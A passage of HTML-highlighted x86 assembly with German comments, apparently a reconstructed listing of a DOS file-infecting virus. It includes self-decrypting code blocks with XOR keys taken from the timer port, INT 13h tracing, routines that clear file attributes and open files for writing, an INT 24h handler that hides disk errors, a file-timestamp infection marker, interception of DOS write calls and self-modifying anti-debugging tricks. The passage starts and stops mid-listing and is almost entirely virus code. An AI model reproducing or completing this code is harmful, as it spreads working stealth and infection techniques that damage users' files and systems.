        </span><span class="sc1">;-------( einsprung )--------------</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0433B</span><span class="sc0">
</span><span class="sc5">J0433A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CLC</span><span class="sc0">
</span><span class="sc5">J0433B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">239Fh</span><span class="sc0">        </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">23h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">85h</span><span class="sc0">          </span><span class="sc1">; CX = 2385</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J04360</span><span class="sc0">          </span><span class="sc1">; DS = CS</span><span class="sc0">

</span><span class="sc5">J04347</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">CLC</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,+</span><span class="sc2">12h</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J04347</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">008Eh</span><span class="sc0">        </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J04364</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0D7Ah</span><span class="sc0">
                </span><span class="sc6">XLAT</span><span class="sc0">                            </span><span class="sc1">; MOV AL,[BX+AL]</span><span class="sc0">
</span><span class="sc5">J04360</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0A4H</span><span class="sc0">
</span><span class="sc5">J04364</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">JMP_Entry</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc5">mut_9</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">25H</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">26H</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">85h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;========================================( Kodiert 1274h... 1B5Ch )===</span><span class="sc0">
</span><span class="sc1">;========================================(       == 3A84 .. 436Ch )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Code_3A84</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">68</span><span class="sc0">
</span><span class="sc5">J04371</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J03A84</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">      </span><span class="sc1">; 1274h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Code_3A84</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J03A84</span><span class="sc0">     </span><span class="sc1">; 08E8h</span><span class="sc0">
</span><span class="sc5">J04377</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J04377</span><span class="sc0">

</span><span class="sc5">J0437D</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J0437D</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J04386</span><span class="sc0">
</span><span class="sc5">J04386</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">XORBYTE_7D</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J04386</span><span class="sc0">  </span><span class="sc1">; +1E</span><span class="sc0">
                                            </span><span class="sc1">; GEGENSTUECK IST DORT !</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">68</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;======================================( Dekodiert 1274h... 1B5Ch )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Decode_3A84</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J03A84</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">      </span><span class="sc1">; 1274h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Code_3A84</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J03A84</span><span class="sc0">     </span><span class="sc1">; 08E8h</span><span class="sc0">
                </span><span class="sc1">;CALL    J04984         ; wie ist es mit dem RET ???</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J043A1</span><span class="sc0">          </span><span class="sc1">; muesste CALL 43A1 heissen .</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">70h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">91h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">7dh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">73h</span><span class="sc0">

</span><span class="sc5">J043A1</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0">  </span><span class="sc1">; &lt;---- !</span><span class="sc0">

</span><span class="sc5">XORBYTE_7D</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; !!!!!!!!</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J043A1</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;======================================================================</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc2">0c7h</span><span class="sc4">,</span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">099h</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc0">
</span><span class="sc1">;==================================================================</span><span class="sc0">
</span><span class="sc1">;===========================================( Vorarbeiten )========</span><span class="sc0">
</span><span class="sc1">;==================================================================</span><span class="sc0">
</span><span class="sc5">J043B1</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">69</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Trace_int_13h</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc0">          </span><span class="sc1">; Get free Space on Disk</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2428</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; DL = Disk</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; AX*BX*CX = Free space in Byte</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; DX = Total Clusters on disk</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">69</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J043DA</span><span class="sc0">

</span><span class="sc5">J043D5</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4000h</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">J0443D</span><span class="sc0">

</span><span class="sc5">J043DA</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">               </span><span class="sc1">; GET FILE-ATTRIBUT</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">J0443D</span><span class="sc0">

                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">70</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24F4</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">          </span><span class="sc1">; Offset Filename</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24F2</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">          </span><span class="sc1">; File-Attribut</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24F6</span><span class="sc4">],</span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; Segment Filename</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">               </span><span class="sc1">; SET File-Attribut</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc10">Error</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">70</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J0443D</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">                </span><span class="sc1">; OPEN FILE / HANDLE</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">J0443D</span><span class="sc0">

                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">71</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; HANDLE NACH BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc0">                  </span><span class="sc1">; GET DISK INFO</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2428</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; DRIVE NR.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; DS:BX : DISK-INFO-BLOCK</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24EC</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J048CD</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">71</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0B4h</span><span class="sc0">
</span><span class="sc1">;=================================================( Fehler melden )===</span><span class="sc0">
</span><span class="sc5">J0443D</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">72</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">; BX = 0ffffh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">J048CD</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">72</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;================================================( INT 24-Handler )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J0444D</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">73</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc10">Error</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">73</span><span class="sc0">
                </span><span class="sc6">IRET</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">8Ch</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==================================( Checkt die Uhrzeit des Files )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">CheckFileTime</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">74</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4400h</span><span class="sc0">                </span><span class="sc1">; Get IOCTL-Dev.Info</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Handle in BX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; DL and 80h = 1: Device,</span><span class="sc0">
                                                </span><span class="sc1">; DL and 80h = 0: Diskfile</span><span class="sc0">
                </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J04483</span><span class="sc0">                  </span><span class="sc1">; es war KEIN Diskfile !</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">; Get File-Timestamp</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; Stunde &gt;= 16 ?</span><span class="sc0">
</span><span class="sc5">J04483</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">74</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0F6h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;======================( von INT 3/21h angesprungen, falls AH=40h )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J0448C</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2581</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">   </span><span class="sc1">; FILEHANDLE</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">J044BA</span><span class="sc0">                  </span><span class="sc1">; KEIN FILE !</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                  </span><span class="sc1">; 2 Segmente vor CS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D257B</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; AX := SAVE-DS</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">; Ist SAVE-DS hîher</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">J044BA</span><span class="sc0">                  </span><span class="sc1">; als D257B, z.B. das</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D257B</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; DS des COMMAND.COM</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J044BA</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=================================( von INT 3=INT 21 angesprungen )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J044A9</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SwapCode_7</span><span class="sc4">],</span><span class="sc2">52h</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2579</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; SAVE-AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; WRITE File</span><span class="sc0">
        </span><span class="sc1">;=============================================================</span><span class="sc0">
        </span><span class="sc1">;durch das obige "SUB BYTE PTR CS:[1CA8h]" wird folgender Code</span><span class="sc0">
        </span><span class="sc1">;=============================================================</span><span class="sc0">
</span><span class="sc5">SwitchByte</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0C6h</span><span class="sc0">    </span><span class="sc1">; aus 0c6h wird 074h, Spiel mit Queue!</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0D2H</span><span class="sc0">    </span><span class="sc1">; es sind genau 8 Byte dazwischen.....</span><span class="sc0">
        </span><span class="sc1">;=============================================================</span><span class="sc0">
        </span><span class="sc1">; folgendermassen verÑndert :</span><span class="sc0">
        </span><span class="sc1">;=============================================================</span><span class="sc0">
        </span><span class="sc1">;        JZ      J0448C</span><span class="sc0">
        </span><span class="sc1">;=============================================================</span><span class="sc0">
</span><span class="sc5">J044BA</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Eh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; INT 3 restaurieren</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SwapCode_7</span><span class="sc4">],</span><span class="sc2">52h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">RestoreRegs</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02AFB</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=================================================( Get File-Size )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">GetFileSize</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">75</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SaveRegisters</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4201h</span><span class="sc0">          </span><span class="sc1">; SEEK von momentaner Position</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">             </span><span class="sc1">; 0 (!) byte weiter</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">FilePos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
                                         </span><span class="sc1">; in DX:AX ist neue/alte Position</span><span class="sc0">
